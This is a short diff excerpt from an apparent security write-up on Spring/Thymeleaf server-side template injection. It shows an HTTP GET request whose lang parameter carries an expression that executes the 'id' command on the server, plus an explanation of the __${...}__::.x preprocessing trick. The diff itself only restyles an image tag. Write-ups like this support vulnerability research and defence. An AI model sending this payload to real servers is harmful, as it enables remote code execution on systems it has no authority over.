@@ -71,7 +71,7 @@ So, the aforementioned controllers may be exploited not by path traversal, but b
 ```http
 GET /path?lang=__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x HTTP/1.1
 ```
-<img src="./exploit.png"><br>
+<p align="center"><img src="./exploit.png" width="600px" alt="exploit image"></p>
 
 In this exploit we use the power of [expression preprocessing](https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/): by surrounding the expression with `__${` and `}__::.x` we can make sure it's executed by thymeleaf no matter what prefixes or suffixes are.
 
